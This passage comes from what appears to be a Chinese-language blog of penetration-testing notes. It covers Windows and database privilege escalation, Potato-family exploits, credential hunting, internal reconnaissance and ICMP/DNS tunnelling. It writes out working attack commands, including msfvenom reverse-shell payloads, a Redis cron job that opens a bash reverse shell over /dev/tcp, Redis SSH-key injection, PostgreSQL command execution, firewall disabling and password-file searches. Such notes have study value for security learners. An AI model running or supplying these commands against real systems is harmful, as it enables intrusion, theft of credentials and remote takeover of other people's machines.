title="UAC绕过"></a>UAC绕过</h3><p>1，MSF模块</p><p>2，UACME项目<br><a href="https://github.com/hfiref0x/UACME">https://github.com/hfiref0x/UACME</a><br>Akagi64.exe 编号 调用执行</p><h3 id="DLL劫持"><a href="#DLL劫持" class="headerlink" title="DLL劫持"></a>DLL劫持</h3><p>在掌握的权限中，需要知道有哪些应用，应用知道后怎么分析调用的dll，尝试对dll文件进行覆盖，程序被执行后就会调用覆盖的dll</p><p>原理：Windows程序启动的时候需要DLL。如果这些DLL不存在，则通过在应用程序要查找的位置放置恶意DLL来提权。通常，Windows应用程序有其预定好的搜索DLL的路径，它会根据下面顺序进行搜索：<br>1，应用程序加载的目录<br>2，C:\Windows\System32<br>3，C:\Windows\System<br>4，C:\Windows<br>5，当前工作目录Currnet Working Directory，CWD<br>6，在PATH环境变量的目录（先系统后用户）<br>过程：信息收集-进程调试-制作dll并上传-替换dll-等待启动应用成功<br>检测调用的dll文件：ChkDllHijack 火绒剑<br>项目：<a href="https://github.com/anhkgg/anhkgg-tools">https://github.com/anhkgg/anhkgg-tools</a><br>利用火绒剑进行进程分析加载DLL，一般寻程序DLL利用。<br>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;xx.xx.xx.xx  lport&#x3D;xx -f dll -o msf.dll<br>将msf.dll替换成应用程序调用的dll文件，后重新启动应用（更偏向于钓鱼）</p><h3 id="未引导号路径"><a href="#未引导号路径" class="headerlink" title="未引导号路径"></a>未引导号路径</h3><p>如果一个服务的可执行文件的路径没有被双引号引起来且包含空格，那么这个服务就是有漏洞的！<br>漏洞原理<br>假设服务路径是：C:\Program Files (x86)\Common Files\Tencent\QQMusic\QQMusicService.exe</p><ul><li>带引号时： “C:\Program Files (x86)\Common Files\Tencent\QQMusic\QQMusicService.exe”会被看成一个完整的服务路径，没有漏洞。</li><li>不带引号时： Windows会认为C:\Program空格后面的为Program这个程序的参数，导致攻击者可以创建一个名为Program.exe的后门文件放在C盘下，等待服务启动时执行。<br>漏洞检测</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic service get name,displayname,pathname,startmode | findstr /i &quot;Auto&quot; | findstr /i /v &quot;C:Windows\&quot; | findstr /i /v &quot;&quot;&quot;</span><br></pre></td></tr></table></figure><h3 id="可控服务"><a href="#可控服务" class="headerlink" title="可控服务"></a>可控服务</h3>]]></content>
      
      
      <categories>
          
          <category> Win权限提升 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Win提升 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>权限提升-2</title>
      <link href="/2025/06/17/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-2/"/>
      <url>/2025/06/17/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-2/</url>
      
        <content type="html"><![CDATA[<h1 id="权限提升-2"><a href="#权限提升-2" class="headerlink" title="权限提升-2"></a>权限提升-2</h1><h2 id="数据库提权"><a href="#数据库提权" class="headerlink" title="数据库提权"></a>数据库提权</h2><p>数据库提权流程：</p><h3 id="1、先获取到数据库用户密码"><a href="#1、先获取到数据库用户密码" class="headerlink" title="1、先获取到数据库用户密码"></a>1、先获取到数据库用户密码</h3><ul><li>网站存在SQL注入漏洞</li><li>数据库的存储文件或备份文件</li><li>网站应用源码中的数据库配置文件</li><li>采用工具或脚本爆破(需解决外联问题)</li></ul><h3 id="2、利用数据库提权项目进行连接"><a href="#2、利用数据库提权项目进行连接" class="headerlink" title="2、利用数据库提权项目进行连接"></a>2、利用数据库提权项目进行连接</h3><p>工具提权：<br>MDUT<br>Databasetools<br>RequestTemplate<br><a href="https://github.com/SafeGroceryStore/MDUT">https://github.com/SafeGroceryStore/MDUT</a><br><a href="https://github.com/Hel10-Web/Databasetools">https://github.com/Hel10-Web/Databasetools</a><br><a href="https://github.com/1n7erface/RequestTemplate">https://github.com/1n7erface/RequestTemplate</a></p><h3 id="3、可利用建立代理解决不支持外联"><a href="#3、可利用建立代理解决不支持外联" class="headerlink" title="3、可利用建立代理解决不支持外联"></a>3、可利用建立代理解决不支持外联</h3><ul><li>利用已知Web权限建立代理（等同于本地连接）</li><li>利用已知权限执行SQL开启外联（让数据库支持外联）</li></ul><p><strong>mysql</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GRANT ALL PRIVILEGES ON *.* TO &#x27;帐号&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;密码&#x27; WITH GRANT OPTION;</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure><p><strong>mssql</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1;</span><br><span class="line">RECONFIGURE;</span><br><span class="line">EXEC sp_configure &#x27;Ad Hoc Distributed Queries&#x27;, 1;</span><br><span class="line">RECONFIGURE;</span><br></pre></td></tr></table></figure><p><strong>oracle</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ALTER SYSTEM SET REMOTE_LOGIN_PASSWORDFILE=EXCLUSIVE SCOPE=SPFILE;</span><br><span class="line">SHUTDOWN IMMEDIATE;</span><br><span class="line">STARTUP;</span><br></pre></td></tr></table></figure><h3 id="4、可利用数据库提权类型条件及技术"><a href="#4、可利用数据库提权类型条件及技术" class="headerlink" title="4、可利用数据库提权类型条件及技术"></a>4、可利用数据库提权类型条件及技术</h3><ul><li><p>MYSQL：PHP+MYSQL 以web入口提权<br>条件：ROOT密码（高版本的-secure-file-priv没进行目录限制）<br>技术：UDF MOF 启动项 反弹Shell</p></li><li><p>MSSQL：.NET+MSSQL 以web入口提权<br>条件：sa密码<br>技术：xp_cmdshell sp_oacreate CLR 沙盒</p></li><li><p>Oracle:(站库分离，非JSP，直接数据库到系统等)<br>条件：数据库用户密码<br>技术：DBA。普通用户，注入模式</p></li><li><p>PostgreSQL<br>Web到系统<br>条件：数据库库用户密码<br>技术：CVE-2019-9193 UDF libc<br>提权原理：</p></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DROP TABLE IF EXISTS cmd_exec;</span><br><span class="line">CREATE TABLE cmd_exec(cmd_output test);</span><br><span class="line">COPY cmd_exec FROM PROGRAM &#x27;id&#x27;;</span><br><span class="line">SELECT * FROM cmd_exec;</span><br></pre></td></tr></table></figure><ul><li>Redis<br>数据库到linux<br>条件：利用未授权或密码连接后执行</li></ul><p>1，定时任务反弹shell<br>利用条件：Redis服务使用ROOT账号启动，安全模式protected-mode处于关闭状态</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir /var/spool/cron</span><br><span class="line">set yy &quot;\n\n\n* * * * * bash -i &gt;&amp; /dev/tcp/ip/端口 0&gt;&amp;1\n\n\n&quot;</span><br><span class="line">config set dbfilename x</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>注意：Centos会忽略乱码取执行格式正确的任务计划，而ubuntu并不会忽略这些代码，所有导致命令执行失败</p><p>2，写入Linux ssh-key公钥<br>利用条件：Redis服务使用ROOT账号启动，安全模式protected-mode处于关闭状态<br>允许使用密钥登录，即可以远程写入公钥，直接登录远程服务器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br><span class="line">cd /root/.ssh/</span><br><span class="line">(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;)</span><br><span class="line">cat key.txt | redis-cli -h 目标IP -x set xxx</span><br></pre></td></tr></table></figure><p>&#x2F;&#x2F;上述步骤在自己的攻击机器上执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">config set dir /root/.ssh/</span><br><span class="line">config set dbfilename authorized_keys</span><br><span class="line">save</span><br></pre></td></tr></table></figure><ul><li>Memcached<br>数据库到linux<br>条件：设置远程可访问或取得本地权限后访问</li></ul><p>是一套常用的key-value缓存系统，由于它本身没有权限控制模块，<br>服务被攻击者发现，通过命令交互可以直接读取memcached中的敏感信息。</p>]]></content>
      
      
      <categories>
          
          <category> 权限提升 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 权限提升 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>权限提升-1</title>
      <link href="/2025/06/17/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-1/"/>
      <url>/2025/06/17/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-1/</url>
      
        <content type="html"><![CDATA[<h1 id="权限提升-1"><a href="#权限提升-1" class="headerlink" title="权限提升-1"></a>权限提升-1</h1><p><strong>1、Web语言权限差异</strong><br>ASP&#x2F;ASP.NET&#x2F;PHP&#x2F;JSP等<br>权限高低：JSP&gt;ASP.NET&gt;ASP&#x3D;PHP<br>使用了java搭建的可以不需要提权，而php需要提权</p><p><strong>2、系统用户权限差异</strong><br>Windows：<br>System：系统组，拥有管理系统资源的权限，包括文件、目录和注册表等。<br>Administrators：管理员组，具有对计算机进行完全访问和操作的权限。<br>Users：用户组，一般用户的默认组别，拥有较低的系统权限。<br>Guests：<br>访客组，可以访问计算机上的公共文件夹和打印机，但不能更改配置和安装程序。<br>Backup Operators：<br>备份操作员组，允许用户备份和还原数据，但不能更改配置安装程序。<br>Power Users：高级用户组，拥有比一般用户更高的系统权限，但比管理员组权限低。<br>Remote Desktop Users：远程桌面用户组，允许用户进行远程桌面连接。<br>Network Configuration Operators：网络配置操作员组，允许用户管理网络配置。<br>Performance Log Users：性能日志用户组，允许用户收集性能日志和计数器数据。<br>Distributed COM Users：<br>分布式 COM 用户组，允许用户使用分布式 COM 连接到计算机。<br>IIS_IUSRS: 用于授权IIS相关服务的用户组。</p><p>Linux：<br>系统用户：UID(0-999)<br>普通用户：UID(1000-*)<br>root用户：UID为0，拥有系统的完全控制权限</p><h2 id="Web到Win-系统提权-MSF-CS"><a href="#Web到Win-系统提权-MSF-CS" class="headerlink" title="Web到Win-系统提权-MSF&amp;CS"></a>Web到Win-系统提权-MSF&amp;CS</h2><p><strong>msf</strong></p><p>1、生成反弹后门</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.139.141 LPORT=3333 -f exe -o msf.exe</span><br></pre></td></tr></table></figure><p>2、配置监听会话</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 0.0.0.0</span><br><span class="line">set lport 3333</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>2.1、筛选EXP模块<br>全自动：快速识别系统中可能被利用的漏洞</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use post/multi/recon/local_exploit_suggester</span><br><span class="line">set showdescription true</span><br></pre></td></tr></table></figure><p>3、利用EXP溢出提权</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">background</span><br><span class="line">use exploit/windows/local/ms16_075_reflection_juicy</span><br><span class="line">set session 1</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p><strong>CS</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chmod +x ./teamserver</span><br><span class="line">chmod +x ./TeamServerImage</span><br><span class="line">./teamserver IP password</span><br></pre></td></tr></table></figure><p>1,创建CS<br>2，创建监听器<br>3，加载脚本插件</p><p><strong>手动检测工具：</strong></p><p>wes-ng<br><a href="https://github.com/bitsadmin/wesng">https://github.com/bitsadmin/wesng</a></p><p>WES-NG 是一款基于 Windows 实用程序输出的工具systeminfo，它提供操作系统易受攻击的漏洞列表，以及针对这些漏洞的任何利用方法。该工具支持 Windows XP 到 Windows 11 之间的所有 Windows 操作系统，包括其对应的 Windows Server 版本。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install wesng</span><br></pre></td></tr></table></figure><p>或使用以下命令行下载 WES-NG ：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/bitsadmin/wesng --depth 1</span><br></pre></td></tr></table></figure><p>执行命令获取最新的漏洞数据库</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wes<span class="selector-class">.py</span> <span class="attr">--update</span></span><br></pre></td></tr></table></figure><p>通过获取对方系统的systeminfo内容，将内容给与wes.py执行查询可能存在的权限提升</p><p><a href="https://github.com/Ascotbe/Kernelhub">https://github.com/Ascotbe/Kernelhub</a><br><a href="https://github.com/nomi-sec/PoC-in-GitHub">https://github.com/nomi-sec/PoC-in-GitHub</a><br><a href="https://www.exploit-db.com/">https://www.exploit-db.com/</a></p><h2 id="土豆家族："><a href="#土豆家族：" class="headerlink" title="土豆家族："></a>土豆家族：</h2><p>土豆提权原理:</p><p>  土豆系列提权的核心是NTLM中继，通过欺骗运行在高权限（Administrator&#x2F;SYSTEM）的账户进行ntlm认证，同时作为中间人对认证过程进行劫持和重放，最后调用本地认证接口使用高权限账号的ntml认证获取一个高权限token，只要当前进程拥有SeImpersonatePrivilege权限即可进行令牌模仿，即可取得对应权限。<br><a href="https://mp.weixin.qq.com/s/OW4ybuqtErh_ovkTWLSr8w">https://mp.weixin.qq.com/s/OW4ybuqtErh_ovkTWLSr8w</a></p><h3 id="GodPotato："><a href="#GodPotato：" class="headerlink" title="GodPotato："></a>GodPotato：</h3><p><a href="https://github.com/BeichenDream/GodPotato">https://github.com/BeichenDream/GodPotato</a></p><p>DCOM rpcss在处理ox时存在一些缺陷，rpcss是系统必须开启的服务，所以它几乎可以运行在任何Windows操作系统上。<br>作用范围：Windows Server 2012 - Windows Server 2022、Windows8 - Windows 11</p><h3 id="SweetPotato："><a href="#SweetPotato：" class="headerlink" title="SweetPotato："></a>SweetPotato：</h3><p><a href="https://github.com/CCob/SweetPotato">https://github.com/CCob/SweetPotato</a><br>作用范围：从Windows 7到Windows 10 &#x2F; Server 2019</p><h3 id="RoguePotato："><a href="#RoguePotato：" class="headerlink" title="RoguePotato："></a>RoguePotato：</h3><p><a href="https://github.com/antonioCoco/RoguePotato">https://github.com/antonioCoco/RoguePotato</a></p><p>Rogue Potato通过指定远程 IP(攻击者 IP)指示 DCOM 服务器执行远程 OXID 查询在远程 IP 上，设置一个”socat”侦听器，用于将 OXID 解析请求重定向到一个假的OXID RPC 服务器伪造的OXID RPC 服务器实现了ResolveOxid2服务器过程；该过程将指向受控命名管道[ncacn_np:localhost&#x2F;pipe&#x2F;roguepotato[pipeepmapper]DCOM 服务器将连接到 RPC 服务器以执行IRemUnkown2接口调用。通过连接到命名管道，将执行”身份验证回调”，我们可以通过 RpcImpersonateClient()调用模拟调用者。</p><p>作用范围：Win 10(部分版本)和Win Server 19</p><h3 id="BadPotato："><a href="#BadPotato：" class="headerlink" title="BadPotato："></a>BadPotato：</h3><p><a href="https://github.com/BeichenDream/BadPotato">https://github.com/BeichenDream/BadPotato</a><br>利用了一个打印机bug，通过调用RpcRemoteFindFirstPrinterChangeNotificationEx让打印机服务通过命名管道发送通知，强行使SYSTEM连接到目标命名管道，然后通过如上介绍的方法直接获取到SYSTEM权限<br>作用范围：Windows 2012-2019、Windows 8-10</p><h3 id="EfsPotato："><a href="#EfsPotato：" class="headerlink" title="EfsPotato："></a>EfsPotato：</h3><p><a href="https://github.com/zcgonvh/EfsPotato">https://github.com/zcgonvh/EfsPotato</a><br>利用MS-EFSR EfsRpcEncryptFileSrv带有 SeImpersonatePrivilege 本地权限升级漏洞<br>作用范围：未知</p><h3 id="MultiPotato："><a href="#MultiPotato：" class="headerlink" title="MultiPotato："></a>MultiPotato：</h3><p><a href="https://github.com/S3cur3Th1sSh1t/MultiPotato">https://github.com/S3cur3Th1sSh1t/MultiPotato</a><br>作用范围：未知</p><h3 id="CandyPotato："><a href="#CandyPotato：" class="headerlink" title="CandyPotato："></a>CandyPotato：</h3><p><a href="https://github.com/klezVirus/CandyPotato">https://github.com/klezVirus/CandyPotato</a><br>0.2 版JuicyPotato。与0.1版本（JuicyPotato）相比，该版本提供了一些改进，例如自动化利用。</p><p>作用范围：win10和server2016</p><h3 id="RasmanPotato"><a href="#RasmanPotato" class="headerlink" title="RasmanPotato:"></a>RasmanPotato:</h3><p><a href="https://github.com/crisprss/RasmanPotato">https://github.com/crisprss/RasmanPotato</a><br>只是另一个土豆，就像其他土豆一样，使用 RasMan 服务进行权限升级</p><p>作用范围：Windows 10(11 not test), Windows Server 2012 - 2019(2022 not test)</p><h3 id="PetitPotato"><a href="#PetitPotato" class="headerlink" title="PetitPotato:"></a>PetitPotato:</h3><p><a href="https://github.com/wh0amitz/PetitPotato">https://github.com/wh0amitz/PetitPotato</a><br>通过 PetitPotam 进行本地权限升级（滥用模拟权限）。<br>作用范围：未知</p><h3 id="JuicyPotatoNG"><a href="#JuicyPotatoNG" class="headerlink" title="JuicyPotatoNG:"></a>JuicyPotatoNG:</h3><p><a href="https://github.com/antonioCoco/JuicyPotatoNG">https://github.com/antonioCoco/JuicyPotatoNG</a><br>利用PrintNotify COM服务进行提权。</p><p>作用范围：Windows 10 - 11 Windows Server 2012 - 2022</p><h3 id="PrintNotifyPotato"><a href="#PrintNotifyPotato" class="headerlink" title="PrintNotifyPotato:"></a>PrintNotifyPotato:</h3><p><a href="https://github.com/BeichenDream/PrintNotifyPotato">https://github.com/BeichenDream/PrintNotifyPotato</a><br>原理：又一个土豆，利用PrintNotify COM服务进行提权，跟JuicyPotatoNG实现相同，只不过JuicyPotatoNG是用c++实现的，而PrintNotifyPotato是用c#实现的。</p><p>作用范围：Windows 10 - 11 Windows Server 2012 - 2022</p><h3 id="CoercedPotato"><a href="#CoercedPotato" class="headerlink" title="CoercedPotato:"></a>CoercedPotato:</h3><p><a href="https://github.com/Prepouce/CoercedPotato">https://github.com/Prepouce/CoercedPotato</a><br>在 Windows 10、Windows 11 和 Server 2022 上通过滥用 SeImpersonatePrivilege 从 Patate（本地&#x2F;网络服务）到 SYSTEM。</p><p>作用范围：Windows 10 - 11 Windows Server 2012 - 2022</p>]]></content>
      
      
      <categories>
          
          <category> 权限提升 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 权限提升 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网-信息收集</title>
      <link href="/2025/06/17/%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2-2/"/>
      <url>/2025/06/17/%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2-2/</url>
      
        <content type="html"><![CDATA[<h1 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h1><p><a href="https://github.com/guchangan1/All-Defense-Tool">https://github.com/guchangan1/All-Defense-Tool</a></p><p><a href="https://cloud.tencent.com/developer/article/2204689">https://cloud.tencent.com/developer/article/2204689</a><br><a href="https://www.cnblogs.com/riyir/p/12593856.html">https://www.cnblogs.com/riyir/p/12593856.html</a></p><p>查询操作系统的信息,补丁信息</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">systeminfo</span></span><br></pre></td></tr></table></figure><p>setspn技术<br>在域环境中运行的大量应用包含了多种资源，为了对资源的合理分类和再分配提供遍历，微软给域内的每种资源分配了不同服务主题名称为即SPN</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setspn -q */*</span><br><span class="line">setspn -T god.org -q */*</span><br></pre></td></tr></table></figure><p>windows2003之前</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall show opmode</span><br><span class="line">netsh firewall <span class="built_in">set</span> opmode disable   #关闭防火墙</span><br></pre></td></tr></table></figure><p>windows2003之后<br>查询防火墙状态</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall show allprofiles state</span><br><span class="line">netsh advfirewall <span class="built_in">set</span> allprofiles state off  #关闭防火墙</span><br></pre></td></tr></table></figure><p>防火墙规则 </p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall firewall show rule name=all</span><br></pre></td></tr></table></figure><p>查看端口：</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano</span><br></pre></td></tr></table></figure><p>杀软的发现：<br><a href="https://github.com/wwl012345/AVCheck">https://github.com/wwl012345/AVCheck</a></p><p>使用命令收集各类敏感密码配置文件</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dir</span> /b /s user.*,pass.*,config.*,username.*password.*</span><br></pre></td></tr></table></figure><p>使用命令查找某个文件的某个字段</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">findstr</span> /c:&quot;user&quot; /c:&quot;pass&quot; /si *.txt</span><br></pre></td></tr></table></figure><p>找出所有包含password的文件</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">findstr</span> /si password *.inc *.config *.ini *.txt *.asp *,aspx *.php *.jsp *.xml *.cgi *.bak</span><br></pre></td></tr></table></figure><h2 id="本机凭证扫描："><a href="#本机凭证扫描：" class="headerlink" title="本机凭证扫描："></a>本机凭证扫描：</h2><p><strong>HackBrowserData</strong><br><a href="https://github.com/moonD4rk/HackBrowserData">https://github.com/moonD4rk/HackBrowserData</a><br>HackBrowserData是一款命令行工具，用于解密和导出浏览器中的数据（密码、历史记录、Cookie、书签、信用卡信息、下载历史记录、本地存储和扩展程序）。它支持市面上最流行的浏览器，并可在 Windows、macOS 和 Linux 上运行。</p><p><strong>Searchcall</strong><br>可以快速搜索服务器中的有关username，passsword,账号，口令的敏感信息还有浏览器的账户密码。<br><a href="https://github.com/Naturehi666/searchall">https://github.com/Naturehi666/searchall</a></p><p><strong>Pillager</strong><br>Pillager 是一种从目标计算机导出和解密有用数据的工具。<br><a href="https://github.com/qwqdanchun/Pillager">https://github.com/qwqdanchun/Pillager</a></p><h2 id="对外打点扫描"><a href="#对外打点扫描" class="headerlink" title="对外打点扫描"></a>对外打点扫描</h2><p><strong>Fscan</strong><br>一款内网综合扫描工具，方便一键自动化、全方位漏扫扫描。<br><a href="https://github.com/shadow1ng/fscan">https://github.com/shadow1ng/fscan</a></p><p><strong>Template</strong><br>提供安全评估和漏洞扫描等相关服<br><a href="https://github.com/1n7erface/Template">https://github.com/1n7erface/Template</a></p><h2 id="AD域环境"><a href="#AD域环境" class="headerlink" title="AD域环境"></a>AD域环境</h2><h3 id="1，Adfind"><a href="#1，Adfind" class="headerlink" title="1，Adfind"></a>1，<strong>Adfind</strong></h3><p>在域环境下非常强大的信息收集工具<br><a href="https://www.softpedia.com/get/Programming/Other-Programming-Files/AdFind.shtml">https://www.softpedia.com/get/Programming/Other-Programming-Files/AdFind.shtml</a><br>域用户查询：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Adfind.exe -users name</span><br><span class="line">Adfind.exe -sc u:webadmin</span><br></pre></td></tr></table></figure><p>域用户组查询：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Adfind.exe -f &quot;objectcategory=computer&quot;</span><br><span class="line">Adfind.exe -f &quot;objectcategory=computer&quot; dn</span><br></pre></td></tr></table></figure><p>查询所有GPO：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Adfind.exe -sc gpodmp</span><br></pre></td></tr></table></figure><p>查询域内委派：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//m</span>p.weixin.qq.com<span class="regexp">/s/</span>WrUyPPBAIE-zmC3CfLYS7Q</span><br></pre></td></tr></table></figure><h3 id="2，BloodHound"><a href="#2，BloodHound" class="headerlink" title="2，BloodHound"></a>2，<strong>BloodHound</strong></h3><p>可视化图形分析域环境中的关系的工具<br>BloodHound 使用图论来揭示 Active Directory 或 Azure 环境中隐藏且通常非预期的关系。攻击者可以使用 BloodHound 快速识别原本无法发现的高度复杂的攻击路径。防御者可以使用 BloodHound 识别并消除相同的攻击路径。红蓝双方都可以使用 BloodHound 来更好地理解 Active Directory 或 Azure 环境中的特权关系。</p>]]></content>
      
      
      <categories>
          
          <category> 内网 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网-隧道技术</title>
      <link href="/2025/06/17/%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2-1/"/>
      <url>/2025/06/17/%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2-1/</url>
      
        <content type="html"><![CDATA[<h1 id="隧道技术"><a href="#隧道技术" class="headerlink" title="隧道技术"></a>隧道技术</h1><p>常见的隧道技术：<br>利用各种隧道技术，以网络防火墙允许的协议，<br>绕过网络防火墙的封锁，实现访问被封锁的目标网络<br>网络层：IPv6 隧道 ，ICMP隧道<br>传输层：TCP 隧道，UDP 隧道，常规端口转发<br>应用层：SSH 隧道，HTPP&#x2F;S 隧道， DNS 隧道</p><p>协议    判断命令<br>ICMP    ping ip or domain<br>HTTP    curl ip or domain<br>SSH     ssh ip or domain<br>DNS     nslookup domain<br>TCP     telnet ip port<br>…     …………</p><h2 id="ICMP"><a href="#ICMP" class="headerlink" title="ICMP"></a>ICMP</h2><p>工具：<br><a href="https://github.com/esrrhs/pingtunnel">https://github.com/esrrhs/pingtunnel</a><br>IMCP 通过 PING 命令访问远程计算机，建立ICMP隧道将 TCP&#x2F;UDP 数据封装到 ICMP 的 PING 数据包中，从而传过防火请，防火请一般不会屏蔽PING数据包，实现不受限制的访问。<br>应用场景：80为入口权限点，ICMP为上线突破口<br>使用场景：目标入站正向被拦截，出站有ICMP出网<br>排查出网协议：curl nslookuo ping 等命令<br>CS上线：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">服务端：</span><br><span class="line">./pingtunnel -<span class="keyword">type</span> <span class="type">server</span></span><br><span class="line"><span class="type"></span>客户端：</span><br><span class="line">将本地的TCP端口<span class="number">6666</span>流量转发到<span class="number">192.168</span>.<span class="number">139.141</span>:<span class="number">7777</span>上面（TCP流量封装icmp转发的）</span><br><span class="line">pingtunnel -<span class="keyword">type</span> <span class="type">client </span>-l :<span class="number">6666</span> -s <span class="number">192.168</span>.<span class="number">139.141</span> -t <span class="number">192.168</span>.<span class="number">139.141</span>:<span class="number">7777</span> -tcp <span class="number">1</span> -noprint <span class="number">1</span> -nolog <span class="number">1</span></span><br></pre></td></tr></table></figure><p>监听：<br>127.0.0.1 6666（后门生成）<br>192.168.139.141 7777 （监听上线）</p><p>MSF：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pingtunnel -type client -l :3333 -s 192.168.139.141 -t 192.168.139.141:3344 -tcp 1 -noprint 1 -nolog 1</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=3333 -f exe -omsf.exe</span><br></pre></td></tr></table></figure><p>监听器配置：<br>use exploit&#x2F;multi&#x2F;handler<br>set payload windows&#x2F;meterpreter&#x2F;reverse_tcp<br>set lhost 0.0.0.0<br>set lport 3344<br>run</p><h2 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h2><p>应用场景：80为入口权限点，DNS为上线突破口<br>适用场景：目标入站正向被拦截，出站有DNS出网<br>域名设置如下：<br>一条A记录指向CS的IP地址<br>vpn.test.site &#x3D;&gt; CS的IP地址<br>几条NS记录指向刚刚A记录对应的域名（也可以只写一条）<br><img 